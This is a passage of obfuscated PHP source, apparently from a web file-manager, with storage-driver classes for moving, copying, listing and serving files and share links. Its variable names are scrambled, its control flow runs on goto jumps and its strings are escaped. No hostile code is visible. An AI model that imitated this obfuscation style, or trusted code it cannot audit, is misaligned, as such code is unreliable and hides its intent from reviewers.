$Bç¼¯—ÂÙŠ = Model($BÎÊî¼­ [167])->where($FÛÈÄÕŞº)->field($BÎÊî¼­ [2381])->select(); foreach ($Bç¼¯—ÂÙŠ as $A·Î‹ Ÿ¹˜) { goto EËŸŞ­¸¥Â; EËŸŞ­¸¥Â: $BÛØùŠêİ² = $A·Î‹ Ÿ¹˜[$BÎÊî¼­ [75]]; $AÄí¾¹†§ = $BªŞŒÏ³•æ . str_replace("\x7b\x69\157\x3a{$dİœàĞæ®}\175\57", $BÎÊî¼­ [33], $BÛØùŠêİ²); if (!IO::exist($BÛØùŠêİ²)) { $D¥Â‰•šŒ[] = $A·Î‹ Ÿ¹˜[$BÎÊî¼­ [419]]; $C¹ÀõŠ¬…->updateFileEnd($A·Î‹ Ÿ¹˜[$BÎÊî¼­ [28]], $A·Î‹ Ÿ¹˜[$BÎÊî¼­ [77]]); continue; } goto b­Ä¹ Îå; A¯ó°İÔ¤¤: $DœŒò¯Æ = array($BÎÊî¼­ [743] => $e¨ÖŞ¯Äæ„, $BÎÊî¼­ [75] => $AÄí¾¹†§); Model($BÎÊî¼­ [167])->where($FÛÈÄÕŞº)->save($DœŒò¯Æ); goto C‡‰ÂÛ‘¦; b­Ä¹ Îå: if (IO::exist($AÄí¾¹†§)) { $C¹ÀõŠ¬…->updateFileEnd($A·Î‹ Ÿ¹˜[$BÎÊî¼­ [28]], $A·Î‹ Ÿ¹˜[$BÎÊî¼­ [77]]); continue; } if (!IO::move($BÛØùŠêİ², get_path_father($AÄí¾¹†§))) { $cŠ“Üï ˆ– = !1; break; } $FÛÈÄÕŞº = array($BÎÊî¼­ [419] => $A·Î‹ Ÿ¹˜[$BÎÊî¼­ [419]]); goto A¯ó°İÔ¤¤; C‡‰ÂÛ‘¦: } $this->removeByFileID($D¥Â‰•šŒ); goto Eß¦†£Õ×‘; A±›ï¼…Ï: $C¹ÀõŠ¬…->task[$BÎÊî¼­ [697]] = (double) $fÁ’êÇ°Ü«; $CÄ¨ÒÃ¯‰ = KodIO::defaultDriver(); $e¨ÖŞ¯Äæ„ = $CÄ¨ÒÃ¯‰[$BÎÊî¼­ [367]]; goto c·âØÃ×œ; A„Ï³¼‘å: $fÁ’êÇ°Ü« = Model($BÎÊî¼­ [422])->where($FÛÈÄÕŞº)->sum($BÎÊî¼­ [77]); $BÌÜÅŞ¯Œ‹ = $BÎÊî¼­ [2378] . $dİœàĞæ®; $C¹ÀõŠ¬… = new TaskFileTransfer($BÌÜÅŞ¯Œ‹, $BÎÊî¼­ [2379], $EÒÍ‹Û¾ëî, LNG($BÎÊî¼­ [2380]) . "\x28{$dİœàĞæ®}\51"); goto A±›ï¼…Ï; Eß¦†£Õ×‘: if (!$cŠ“Üï ˆ–) { $C¹ÀõŠ¬…->stop($BÌÜÅŞ¯Œ‹); return !1; } $C¹ÀõŠ¬…->end(); $this->remove($dİœàĞæ®); goto cÜô¸ß»×‹; aÆ£ëÓ“–„: $BÎÊî¼­  =& $_SERVER[‚Ğ°–—î]; $FÛÈÄÕŞº = array($BÎÊî¼­ [743] => $dİœàĞæ®); $EÒÍ‹Û¾ëî = Model($BÎÊî¼­ [422])->where($FÛÈÄÕŞº)->count(); goto A„Ï³¼‘å; cÜô¸ß»×‹: } public function progress($Aƒ”é¥Èñé) { return Task::get($_SERVER[‚Ğ°–—î][2378] . $Aƒ”é¥Èñé); } private function removeByFileID($c­äÙƒéÏ = array()) { goto EùÍó‹”ğ; Dä³›Şè: foreach ($F«ã­­Åíœ as $E¬’ÚÄˆ¥Ï) { Model($D»šê™ğ™„[382])->removeNow($E¬’ÚÄˆ¥Ï, !1); } goto E„ì«¡¾Ö; EùÍó‹”ğ: $D»šê™ğ™„ =& $_SERVER[‚Ğ°–—î]; if (empty($c­äÙƒéÏ)) { return; } $C¿‰Ş‰ß£‚ = array($D»šê™ğ™„[419] => array($D»šê™ğ™„[7], $c­äÙƒéÏ)); goto fÕÉ”ïÔ®; fÕÉ”ïÔ®: $F«ã­­Åíœ = Model($D»šê™ğ™„[1118])->where($C¿‰Ş‰ß£‚)->field($D»šê™ğ™„[369])->select(); if (!$F«ã­­Åíœ) { return; } $F«ã­­Åíœ = array_to_keyvalue($F«ã­­Åíœ, $D»šê™ğ™„[33], $D»šê™ğ™„[369]); goto Dä³›Şè; E„ì«¡¾Ö: } private function removeShareItems($e°Òîá—Øù) { goto D§ İŸÍŒ; D§ İŸÍŒ: $AºÅ¯õÀ› =& $_SERVER[‚Ğ°–—î]; $a¸àÅÒŠ÷ = "\173\151\x6f\72{$e°Òîá—Øù}\175\x2f"; $F«‰¾ãË = array($AºÅ¯õÀ›[369] => 0, $AºÅ¯õÀ›[1020] => array($AºÅ¯õÀ›[751], "{$a¸àÅÒŠ÷}\45")); goto EË‰äÈÁÁ¾; føî¨Õ¼à®: Model($AºÅ¯õÀ›[536])->remove($aĞ­İ¼òµ); goto CŒŞéñŒ¥©; EË‰äÈÁÁ¾: $F™àËÍ³Ñ‘ = Model($AºÅ¯õÀ›[2084])->where($F«‰¾ãË)->field($AºÅ¯õÀ›[441])->select(); if (empty($F™àËÍ³Ñ‘)) { return; } $aĞ­İ¼òµ = array_to_keyvalue($F™àËÍ³Ñ‘, $AºÅ¯õÀ›[33], $AºÅ¯õÀ›[441]); goto føî¨Õ¼à®; CŒŞéñŒ¥©: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\x4c\151\x67\150\164\x41\160\160"; public $modelType = "\x53\171\163\x74\145\x6d\x4f\160\x74\x69\157\156"; public $field = array("\156\x61\155\145", "\147\x72\157\165\160", "\144\x65\x73\x63", "\143\x6f\x6e\x74\x65\156\x74"); public function listData($F¢äŠÒŞ´’ = false, $E‡ƒ•ç³è½ = "\155\x6f\144\x69\146\171\124\151\x6d\x65", $AªİÑ±àœ„ = true) { return parent::listData($F¢äŠÒŞ´’, $E‡ƒ•ç³è½, $AªİÑ±àœ„); } public function remove($d—‡Õì’ò­) { $A¦åùæ¾Ñï = $this->findByName($d—‡Õì’ò­); if (!$A¦åùæ¾Ñï) { return !1; } return parent::remove($A¦åùæ¾Ñï[$_SERVER[‚Ğ°–—î][367]]); } public function add($B×â‹Á§¾²) { if ($this->findByName($B×â‹Á§¾²[$_SERVER[‚Ğ°–—î][28]])) { return !1; } return parent::insert($B×â‹Á§¾²); } public function update($eŞ·î¯„õ, $b²ÓºÕÜ°) { $b  Óèíò =& $_SERVER[‚Ğ°–—î]; $c“ÏÜ¡¡¦ = $this->findByName($eŞ·î¯„õ); $F¸ÒÃ½æå… = $this->findByName($b²ÓºÕÜ°[$b  Óèíò[28]]); if (!$c“ÏÜ¡¡¦ || $F¸ÒÃ½æå… && $F¸ÒÃ½æå…[$b  Óèíò[367]] != $c“ÏÜ¡¡¦[$b  Óèíò[367]]) { return !1; } return parent::update($c“ÏÜ¡¡¦[$b  Óèíò[367]], $b²ÓºÕÜ°); } } goto dÍÓê®©š; e ¦‹¡¸È: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($F«ÇŞ–éÏğ) { $this->pathParse = $F«ÇŞ–éÏğ; $this->model = Model($_SERVER[‚Ğ°–—î][1118]); } public function getPath($a¹Ó£¼íî) { return trim($a¹Ó£¼íî, $_SERVER[‚Ğ°–—î][8]); } public function pathFather($aœ©êÆË) { $a§‰“‰Ä = $this->parse($aœ©êÆË); $a§‰“‰Ä = $this->infoSimple($aœ©êÆË); return $a§‰“‰Ä ? $a§‰“‰Ä[$_SERVER[‚Ğ°–—î][461]] : !1; } public function getPathName($bÈœá‘İ±) { $DÚ¡™“ó = $this->infoSimple($bÈœá‘İ±); return $DÚ¡™“ó ? $DÚ¡™“ó[$_SERVER[‚Ğ°–—î][28]] : !1; } public function getPathOuter($EÕÒ¦ÀÏ) { if (!$EÕÒ¦ÀÏ) { return $EÕÒ¦ÀÏ; } $càí×ƒ×”á = $this->parse($EÕÒ¦ÀÏ); return KodIO::make($càí×ƒ×”á[$_SERVER[‚Ğ°–—î][367]]); } public function copyFolderFromIO($e›õ¸Ğô¯³, $e—é®Ä‡í‘, $eíÕÈŞ‰ÃØ, $dô‡™Íåï, $d¡ŸïÑ·Ñ) { $a ğ³°©ŒÉ = $this->model->copyFolderFromIO($e›õ¸Ğô¯³, $e—é®Ä‡í‘, $eíÕÈŞ‰ÃØ, $dô‡™Íåï, $d¡ŸïÑ·Ñ); return KodIO::make($a ğ³°©ŒÉ); } public function isParentOf($eô«ÒÆïĞ¥, $d ƒ§•¸ó) { return $this->model->isParentOf($eô«ÒÆïĞ¥, $d ƒ§•¸ó); } public function mkfile($E‚ŠÂÂæœ, $B˜“’¤èÚ« = '', $Fô¸ô”äè÷ = REPEAT_RENAME) { $A¬ó¸—êŠ =& $_SERVER[‚Ğ°–—î]; $cÎ‹§ˆ¹ø• = $this->parse($E‚ŠÂÂæœ); $E‚ŠÂÂæœ = $cÎ‹§ˆ¹ø•[$A¬ó¸—êŠ[367]]; for ($dÆœ­±…± = 0; $dÆœ­±…± < count($cÎ‹§ˆ¹ø•[$A¬ó¸—êŠ[1119]]); $dÆœ­±…±++) { $B„à‹„¡Ëä = $cÎ‹§ˆ¹ø•[$A¬ó¸—êŠ[1119]][$dÆœ­±…±]; if ($dÆœ­±…± == count($cÎ‹§ˆ¹ø•[$A¬ó¸—êŠ[1119]]) - 1) { $E‚ŠÂÂæœ = $this->model->mkfile($E‚ŠÂÂæœ, $B„à‹„¡Ëä, $B˜“’¤èÚ«, $Fô¸ô”äè÷); break; } $E‚ŠÂÂæœ = $this->model->mkdir($E‚ŠÂÂæœ, $B„à‹„¡Ëä, REPEAT_SKIP); } return $this->getPathOuter($E‚ŠÂÂæœ); } public function mkdir($C‡â’¶óÏê, $A¿ïƒã†£± = REPEAT_SKIP) { $CÊÏ¿µ×Ş =& $_SERVER[‚Ğ°–—î]; $D‡¯•»ÊòÕ = $this->parse($C‡â’¶óÏê); $C‡â’¶óÏê = $D‡¯•»ÊòÕ[$CÊÏ¿µ×Ş[367]]; for ($Eø ·„”– = 0; $Eø ·„”– < count($D‡¯•»ÊòÕ[$CÊÏ¿µ×Ş[1119]]); $Eø ·„”–++) { $FŸÀî«íÇ´ = $D‡¯•»ÊòÕ[$CÊÏ¿µ×Ş[1119]][$Eø ·„”–]; $C‡â’¶óÏê = $this->model->mkdir($C‡â’¶óÏê, $FŸÀî«íÇ´, $A¿ïƒã†£±); } return $this->getPathOuter($C‡â’¶óÏê); } public function copyFile($eœ§¥º©”, $Fñâ¶ôŞ¾ä, $Dµ¸ä¸» = REPEAT_REPLACE) { $föåõ¢ÊÇä =& $_SERVER[‚Ğ°–—î]; $bÀß§»Ó¡ = $this->parse($Fñâ¶ôŞ¾ä); $B”‹ÒÆÙïÏ = $this->model->copy($eœ§¥º©”, $bÀß§»Ó¡[$föåõ¢ÊÇä[367]], $Dµ¸ä¸», $bÀß§»Ó¡[$föåõ¢ÊÇä[75]]); return $B”‹ÒÆÙïÏ ? $this->getPathOuter($B”‹ÒÆÙïÏ) : !1; } public function moveFile($CÍ©ŸŸë, $D»¯µ·Ñõ£, $b„’©¼ß‰ = REPEAT_REPLACE) { $DÙ©’‰éÇÌ =& $_SERVER[‚Ğ°–—î]; $BƒÏñ–»£« = $this->parse($D»¯µ·Ñõ£); $CÅ­ˆ—¤‹ = $this->model->move($CÍ©ŸŸë, $BƒÏñ–»£«[$DÙ©’‰éÇÌ[367]], $b„’©¼ß‰, $BƒÏñ–»£«[$DÙ©’‰éÇÌ[75]]); return $CÅ­ˆ—¤‹ ? $this->getPathOuter($CÅ­ˆ—¤‹) : !1; } public function copy($D¡™ê²Ó‰ò, $BÄ®™ã²³å, $Ağ®®ÉØÆÔ = REPEAT_REPLACE) { $F‡ùà” Šá = $this->parse($BÄ®™ã²³å); $F÷„ÌëÁ¸± = $this->model->copy($D¡™ê²Ó‰ò, $F‡ùà” Šá[$_SERVER[‚Ğ°–—î][367]], $Ağ®®ÉØÆÔ); return $F÷„ÌëÁ¸± ? $this->getPathOuter($F÷„ÌëÁ¸±) : !1; } public function moveSameAllow() { } public function move($B‘…¯•Áêİ, $fõ„ÉŠ—‰ƒ, $a…ä ë§Ûİ = REPEAT_REPLACE) { $AËÜÈŠ»‡» = $this->parse($fõ„ÉŠ—‰ƒ); $d¿‡’ ´¤‚ = $this->model->move($B‘…¯•Áêİ, $AËÜÈŠ»‡»[$_SERVER[‚Ğ°–—î][367]], $a…ä ë§Ûİ); return $d¿‡’ ´¤‚ ? $this->getPathOuter($d¿‡’ ´¤‚) : !1; } public function remove($fäÑÇÂ¸½¬, $F«¤³Ùö¡‚ = true) { return $this->model->remove($fäÑÇÂ¸½¬, $F«¤³Ùö¡‚); } public function rename($a×³Ø‡™Ùë, $Dƒğ˜å¸Î) { $AÎ»æ¨ÑƒŠ = $this->model->rename($a×³Ø‡™Ùë, $Dƒğ˜å¸Î); return $AÎ»æ¨ÑƒŠ ? $this->getPathOuter($a×³Ø‡™Ùë) : $AÎ»æ¨ÑƒŠ; } public function size($FÒÚš™›Ğ) { $FŸØ›²Ü² = $this->infoSimple($FÒÚš™›Ğ); return $FŸØ›²Ü² ? $FŸØ›²Ü²[$_SERVER[‚Ğ°–—î][77]] : 0; } public function infoSimple($e’†±íöè) { return $this->model->sourceInfo($e’†±íöè); } public function info($Aƒ•·éš‚) { return $this->infoParse($Aƒ•·éš‚); } public function infoAuth($d»ÕÊ‘ËŞ‹) { return $this->infoParse($d»ÕÊ‘ËŞ‹, !1, !0); } public function infoWithChildren($fõÃæÈÃ‹‰) { return $this->infoParse($fõÃæÈÃ‹‰, !0); } protected function infoParse($e³Êíçµ, $bİ¶ãÚ·ƒ³ = false, $f¥íë‚ââ‘ = false) { if (!$bİ¶ãÚ·ƒ³) { return $this->model->pathInfo($e³Êíçµ, $f¥íë‚ââ‘); } return $this->model->pathInfoMore($e³Êíçµ); } public function infoFull($C¼Š¶í‘¢…) { $eŒ®¼–ù© =& $_SERVER[‚Ğ°–—î]; $B§»‹âáß  = explode($eŒ®¼–ù©[8], $C¼Š¶í‘¢…); $cÅ¼…µ×Ä¤ = implode($eŒ®¼–ù©[8], array_splice($B§»‹âáß , 1)); return $this->model->pathInfoByPath($B§»‹âáß [0], $cÅ¼…µ×Ä¤); } public function hashSimple($DÌ—õ‹Û…È) { $A‚Í¶õˆØ® =& $_SERVER[‚Ğ°–—î]; $aãÄ‰œÖ›• = $this->infoWithChildren($DÌ—õ‹Û…È); return $aãÄ‰œÖ›•[$A‚Í¶õˆØ®[162]][$A‚Í¶õˆØ®[164]]; } public function hashMd5($d­¸™’§°) { $DÓË¢¢ Ñ =& $_SERVER[‚Ğ°–—î]; $A¨Ş­ôÎŒõ = $this->infoWithChildren($d­¸™’§°); return $A¨Ş­ôÎŒõ[$DÓË¢¢ Ñ[162]][$DÓË¢¢ Ñ[163]]; } public function exist($aµÛ¥‡¤·ç) { $b˜—ÉèÆÀ´ =& $_SERVER[‚Ğ°–—î]; $D®•õÀğ†® = $this->parse($aµÛ¥‡¤·ç); if (!$D®•õÀğ†®[$b˜—ÉèÆÀ´[75]]) { return $this->isFile($aµÛ¥‡¤·ç) || $this->isFolder($aµÛ¥‡¤·ç); } $eĞÆå®±Ä‘ = array($b˜—ÉèÆÀ´[368] => $D®•õÀğ†®[$b˜—ÉèÆÀ´[367]], $b˜—ÉèÆÀ´[28] => $D®•õÀğ†®[$b˜—ÉèÆÀ´[75]]); $a£â¬¨õ—ã = $this->model->where($eĞÆå®±Ä‘)->find(); return $a£â¬¨õ—ã ? !0 : !1; } public function isFile($fáİùº¡‚„) { $c¿¢‰¸Ûã =& $_SERVER[‚Ğ°–—î]; $bš·‘¹¼—¹ = $this->infoSimple($fáİùº¡‚„); return $bš·‘¹¼—¹ && $bš·‘¹¼—¹[$c¿¢‰¸Ûã[370]] == $c¿¢‰¸Ûã[83] ? !1 : !0; } public function isFolder($cÖÓà‘›Ğ˜) { $EÚçä¢‡ìº =& $_SERVER[‚Ğ°–—î]; $f¹¶İñ…àŸ = $this->infoSimple($cÖÓà‘›Ğ˜); return $f¹¶İñ…àŸ && $f¹¶İñ…àŸ[$EÚçä¢‡ìº[370]] == $EÚçä¢‡ìº[83] ? !0 : !1; } public function listPath($a‚¹‡ó¥áŠ, $eğ×Ì©Šš° = false) { $C¾Ê–¹‘­ =& $_SERVER[‚Ğ°–—î]; if ($a‚¹‡ó¥áŠ == $C¾Ê–¹‘­[33]) { return !1; } $EÁË¿ò¾»  = array($C¾Ê–¹‘­[368] => $a‚¹‡ó¥áŠ); if ($eğ×Ì©Šš°) { return $this->model->listSource($EÁË¿ò¾» , -1); } return $this->model->listSource($EÁË¿ò¾» ); } public function has($dËÌ¡Ë Š“, $f¨‚Ïì½ğ‘ = false, $c¡ÒÙæ¢Ğõ = null) { $cæ«¯¤ŞĞ½ =& $_SERVER[‚Ğ°–—î]; $BÓ‡æï°ˆ‘ = $this->infoWithChildren($dËÌ¡Ë Š“); if ($f¨‚Ïì½ğ‘) { return array($cæ«¯¤ŞĞ½[192] => $BÓ‡æï°ˆ‘[$cæ«¯¤ŞĞ½[192]], $cæ«¯¤ŞĞ½[191] => $BÓ‡æï°ˆ‘[$cæ«¯¤ŞĞ½[191]]); } return $c¡ÒÙæ¢Ğõ ? $BÓ‡æï°ˆ‘[$cæ«¯¤ŞĞ½[192]] : $BÓ‡æï°ˆ‘[$cæ«¯¤ŞĞ½[191]]; } public function listAll($aö‹ŸÉ½) { $e´•´¾½ëŒ = IO::info($this->pathParse[$_SERVER[‚Ğ°–—î][75]]); if (!$e´•´¾½ëŒ) { return array(); } return $this->model->listAll($aö‹ŸÉ½); } public function getContent($d·ñ–½øŒ) { return $this->model->getContent($d·ñ–½øŒ); } public function setContent($f…Æ’öˆÖ˜, $fÑ¡ø——— = '') { return $this->model->setContent($f…Æ’öˆÖ˜, $fÑ¡ø———); } public function fileSubstr($eá±º×É£Â, $BŒ„‚³šŠµ, $E‚¢‹ƒ·ƒî) { return $this->model->fileSubstr($eá±º×É£Â, $BŒ„‚³šŠµ, $E‚¢‹ƒ·ƒî); } public function download($Dî·–¡æê‘, $BŒÌ¦—îÍí = '') { $b›âÊñ‰»‡ = get_path_father($BŒÌ¦—îÍí); $FŒ¬ÍåÉÌ = get_path_this($BŒÌ¦—îÍí); $EÖ¸¸†õ”„ = $this->model->fileInfoGet($Dî·–¡æê‘); $bò…Ê‡äÏá = IO::copy($EÖ¸¸†õ”„[$_SERVER[‚Ğ°–—î][75]], $b›âÊñ‰»‡, !1, $FŒ¬ÍåÉÌ); return $bò…Ê‡äÏá; } public function upload($c°¸ÕœÊĞî, $bù©ñ†‰¨ñ, $a£ÇŸ„è– = false, $Eª¿Í°Ñä• = REPEAT_REPLACE) { $eìÂ¶¼à® =& $_SERVER[‚Ğ°–—î]; $A”¸®×®Î = $this->parse($c°¸ÕœÊĞî); $D©Ó°ì©¥ó = $this->model->addFile($A”¸®×®Î[$eìÂ¶¼à®[367]], $bù©ñ†‰¨ñ, $A”¸®×®Î[$eìÂ¶¼à®[75]], $a£ÇŸ„è–, $Eª¿Í°Ñä•); return $this->getPathOuter($D©Ó°ì©¥ó); } public function uploadFileByID($C»£½š£‘Û, $cÔ¼å·ğ, $f·ÄÅƒï¡…) { $E­¯¾øÃ²î =& $_SERVER[‚Ğ°–—î]; $DäÓ²Ğ±ƒ = $this->parse($C»£½š£‘Û); $C±ù–ƒó› = $this->model->addFileByFileID($DäÓ²Ğ±ƒ[$E­¯¾øÃ²î[367]], $cÔ¼å·ğ, $DäÓ²Ğ±ƒ[$E­¯¾øÃ²î[75]], $f·ÄÅƒï¡…); return $this->getPathOuter($C±ù–ƒó›); } public function addFileByRemote($B„ê„¸¦‰, $eÓˆ¥é‡í, $C…¹ºæö† = array(), $Bé¥ÄÈ‘ = '', $aˆõŒ”ë‘›) { $BöøÇ‹„«¤ =& $_SERVER[‚Ğ°–—î]; $DºÒ‘‹®‰÷ = $this->parse($B„ê„¸¦‰); $Bé¥ÄÈ‘ = empty($Bé¥ÄÈ‘) ? $DºÒ‘‹®‰÷[$BöøÇ‹„«¤[75]] : $Bé¥ÄÈ‘; $FèÖ³êÙé = $this->model->addFileByRemote($DºÒ‘‹®‰÷[$BöøÇ‹„«¤[367]], $eÓˆ¥é‡í, $Bé¥ÄÈ‘, $C…¹ºæö†, $aˆõŒ”ë‘›); return $this->getPathOuter($FèÖ³êÙé); } public function uploadLink($F”ãÌ“–Î, $eê¥Òœ–Ø± = 0) { $B÷»ˆ‹„› =& $_SERVER[‚Ğ°–—î]; $C°ïÉ‹¨é£ = $this->parse($F”ãÌ“–Î); $F”ãÌ“–Î = Model($B÷»ˆ‹„›[544])->createFileName($C°ïÉ‹¨é£[$B÷»ˆ‹„›[75]]); $C›¬õ„Ãù = IO::uploadLink($F”ãÌ“–Î, $eê¥Òœ–Ø±); return $C›¬õ„Ãù; } public function fileNameAuto($DÏÈ¤Êˆ¼, $fƒ—¡ùÏ‘Ñ, $c§™÷ÕÒ Í = REPEAT_REPLACE, $AÁœò©¥ = false) { return $this->model->fileNameAuto($DÏÈ¤Êˆ¼, $fƒ—¡ùÏ‘Ñ, $c§™÷ÕÒ Í, $AÁœò©¥); } public function fileNameExist($Bëìº°Ù”ç, $E›©§—ñå†) { return $this->model->fileNameExist($Bëìº°Ù”ç, $E›©§—ñå†); } protected function _fileOut($AÕºä“ï, $aŸŞ°óŒ‹ = false, $D¡‰Ïë—­Ê = false, $c¬‚ĞÄÌó¹ = '', $f÷Â¹Ÿ¨å = false) { goto d½‡¼áà; BÉš‚œíêã: $d»Ï‰Ô¯Ô = $this->model->fileInfoGet($AÕºä“ï); $c¬‚ĞÄÌó¹ = $d»Ï‰Ô¯Ô[$BùÖ”Ò©Ä[163]] ? $d»Ï‰Ô¯Ô[$BùÖ”Ò©Ä[163]] : $c¬‚ĞÄÌó¹; $bÚ‡…©ÑŠ = isset($GLOBALS[$BùÖ”Ò©Ä[1121]]) ? $GLOBALS[$BùÖ”Ò©Ä[1121]] : $A±Ä—‹›÷ñ[$BùÖ”Ò©Ä[28]]; goto AçôØß„“„; AçôØß„“„: if ($f÷Â¹Ÿ¨å) { return IO::fileOutServer($d»Ï‰Ô¯Ô[$BùÖ”Ò©Ä[75]], $aŸŞ°óŒ‹, $bÚ‡…©ÑŠ, $c¬‚ĞÄÌó¹); } IO::fileOut($d»Ï‰Ô¯Ô[$BùÖ”Ò©Ä[75]], $aŸŞ°óŒ‹, $bÚ‡…©ÑŠ, $c¬‚ĞÄÌó¹); goto F İ×†âÕ°; d½‡¼áà: $BùÖ”Ò©Ä =& $_SERVER[‚Ğ°–—î]; $A±Ä—‹›÷ñ = $this->model->sourceInfo($AÕºä“ï); if ($A±Ä—‹›÷ñ[$BùÖ”Ò©Ä[370]] == $BùÖ”Ò©Ä[83]) { header($BùÖ”Ò©Ä[1120]); die; } goto BÉš‚œíêã; F İ×†âÕ°: } public function fileOut($aµİÄù¦áÒ, $Bƒƒä·ƒ“‘ = false, $cã¬×¾—ßî = false, $cÇôë¯Šñö = '') { $this->_fileOut($aµİÄù¦áÒ, $Bƒƒä·ƒ“‘, $cã¬×¾—ßî, $cÇôë¯Šñö); } public function fileOutServer($c‚óíç±—­, $CÜÅ¼¼ÛÒœ = false, $fŒğº²ö¸° = false, $FÉ˜‡°Ã‡¹ = '') { $this->_fileOut($c‚óíç±—­, $CÜÅ¼¼ÛÒœ, $fŒğº²ö¸°, $FÉ˜‡°Ã‡¹, !0); } protected function _fileOutImage($d»©‚Í«ß, $Fæ¾¾è›ñ = 250) { $DğöÍ½Ë¶ =& $_SERVER[‚Ğ°–—î]; $aòËé¬Ş®´ = $this->model->sourceInfo($d»©‚Í«ß); if ($aòËé¬Ş®´[$DğöÍ½Ë¶[370]] == $DğöÍ½Ë¶[83]) { show_json($DğöÍ½Ë¶[1122] . $d»©‚Í«ß, !1); } $GLOBALS[$DğöÍ½Ë¶[1121]] = $aòËé¬Ş®´[$DğöÍ½Ë¶[28]]; $B¡½‰ùº­ = $this->model->fileInfoGet($d»©‚Í«ß); IO::fileOutImage($B¡½‰ùº­[$DğöÍ½Ë¶[75]], $Fæ¾¾è›ñ); } public function fileOutImage($f‹‰»Ä¨ÚÅ, $CÔ«•ìÀ§á = 250) { $this->_fileOutImage($f‹‰»Ä¨ÚÅ, $CÔ«•ìÀ§á); } public function fileOutImageServer($A§öäø ÕÚ, $EØ©åÓ„ = 250) { $this->_fileOutImage($A§öäø ÕÚ, $EØ©åÓ„); } public function link($FäÅäˆ¤Òİ, $DÃ„Äñ‚¡¤ = '') { $AÓŠÙ¹ó²‡ = $this->model->fileInfoGet($FäÅäˆ¤Òİ); return IO::link($AÓŠÙ¹ó²‡[$_SERVER[‚Ğ°–—î][75]], $DÃ„Äñ‚¡¤); } protected function parse($AïÖø®Õ) { $e¶ÑóĞºßë =& $_SERVER[‚Ğ°–—î]; if (strstr($AïÖø®Õ, $e¶ÑóĞºßë[8]) === !1) { return array($e¶ÑóĞºßë[385] => intval($AïÖø®Õ), $e¶ÑóĞºßë[75] => $e¶ÑóĞºßë[33], $e¶ÑóĞºßë[1119] => array()); } $eÓ±ã†¿Œ” = explode($e¶ÑóĞºßë[8], trim($AïÖø®Õ, $e¶ÑóĞºßë[8])); if (count($eÓ±ã†¿Œ”) < 2) { show_tips($AïÖø®Õ . $e¶ÑóĞºßë[1123]); } return array($e¶ÑóĞºßë[385] => intval($eÓ±ã†¿Œ”[0]), $e¶ÑóĞºßë[75] => $eÓ±ã†¿Œ”[1], $e¶ÑóĞºßë[1119] => array_slice($eÓ±ã†¿Œ”, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($dØÙğææŞ) { $this->pathParse = $dØÙğææŞ; $this->model = Model($_SERVER[‚Ğ°–—î][1118]); } public function getPathOuter($AÙê×ÃÒä) { $BŸæ²Ã©ÒÎ =& $_SERVER[‚Ğ°–—î]; if (!$AÙê×ÃÒä) { return $AÙê×ÃÒä; } $D¿èîÌâˆ = $this->parse($AÙê×ÃÒä); return trim(KodIO::makeShare($this->pathParse[$BŸæ²Ã©ÒÎ[367]], $D¿èîÌâˆ[$BŸæ²Ã©ÒÎ[367]]), $BŸæ²Ã©ÒÎ[8]); } protected function infoParse($b…°ö­”Šä, $EÙ‹ËŸè¹ö = false, $EÑ£æ’óæ = false) { $EĞ‹Àîä”Î =& $_SERVER[‚Ğ°–—î]; $fÄãò®—À£ = $this->pathParse[$EĞ‹Àîä”Î[367]]; $Bôã²÷ù‰‘ = trim($this->pathParse[$EĞ‹Àîä”Î[1013]], $EĞ‹Àîä”Î[8]); return Action($EĞ‹Àîä”Î[1124])->sharePathInfo($fÄãò®—À£, $Bôã²÷ù‰‘); } public function infoFull($bˆ’ÍàŠ…â) { $EÒóéÊ¡˜ =& $_SERVER[‚Ğ°–—î]; $DµÕ˜ƒğê” = explode($EÒóéÊ¡˜[8], trim($bˆ’ÍàŠ…â, $EÒóéÊ¡˜[8])); if (count($DµÕ˜ƒğê”) > 1) { $EÄÅìĞ¸åâ = implode($EÒóéÊ¡˜[8], array_splice($DµÕ˜ƒğê”, 1)); $C²ò…†§ÔÍ = $this->model->pathInfoByPath($DµÕ˜ƒğê”[0], $EÄÅìĞ¸åâ); if (!$C²ò…†§ÔÍ) { return !1; } $this->pathParse[$EÒóéÊ¡˜[1013]] = $C²ò…†§ÔÍ[$EÒóéÊ¡˜[369]]; } return $this->infoParse($bˆ’ÍàŠ…â); } public function listAll($a‘¼áÔÈ•) { goto Fí­ÂÊòé‚; Fí­ÂÊòé‚: $F¹¾Ö¤¸ =& $_SERVER[‚Ğ°–—î]; $dÔô»¤©Ñ° = IO::info($this->pathParse[$F¹¾Ö¤¸[75]]); if (!$dÔô»¤©Ñ°) { return array(); } goto Bå…Â·­”Š; Bå…Â·­”Š: $aŒÊÊÎÁØç = $this->model->listAll($a‘¼áÔÈ•); $A‰„ÉŠ…ÑÂ = Model($F¹¾Ö¤¸[536])->getInfo($dÔô»¤©Ñ°[$F¹¾Ö¤¸[441]]); $EñƒÍŸ¤–‰ = Action($F¹¾Ö¤¸[1124]); goto C†°œî¡„¾; C†°œî¡„¾: foreach ($aŒÊÊÎÁØç as &$bƒĞªŸò±‹) { check_abort(); $bƒĞªŸò±‹[$F¹¾Ö¤¸[391]] = $EñƒÍŸ¤–‰->_shareItemeParse($bƒĞªŸò±‹[$F¹¾Ö¤¸[391]], $A‰„ÉŠ…ÑÂ); } return $aŒÊÊÎÁØç; goto f‰¹¯Ø”¸º; f‰¹¯Ø”¸º: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($a¸¹«¸äÙõ) { $this->pathParse = $a¸¹«¸äÙõ; $this->model = Model($_SERVER[‚Ğ°–—î][1118]); } protected function infoParse($AòÒá‡êĞÜ, $cš‰‰êÑäŸ = false, $cÜ±„ÑÌ©Ÿ = false) { $C¨×ïç†‰ =& $_SERVER[‚Ğ°–—î]; return Action($C¨×ïç†‰[1019])->sharePathInfo($this->pathParse[$C¨×ïç†‰[75]], !0); } public function listPath($eºÉ†„ì í, $c¿¬ä¨‡Åã = false) { $Cä‡«Ù°Ö =& $_SERVER[‚Ğ°–—î]; $d¥‘—´àßÕ = parent::listPath($eºÉ†„ì í, $c¿¬ä¨‡Åã); foreach ($d¥‘—´àßÕ as $Cö­·ä„Û‹ => $EˆàÉŒ¿«) { if (!in_array($Cö­·ä„Û‹, array($Cä‡«Ù°Ö[73], $Cä‡«Ù°Ö[74]))) { continue; } foreach ($EˆàÉŒ¿« as $Fèç±ßÅ => $f”‹²ÍØçš) { 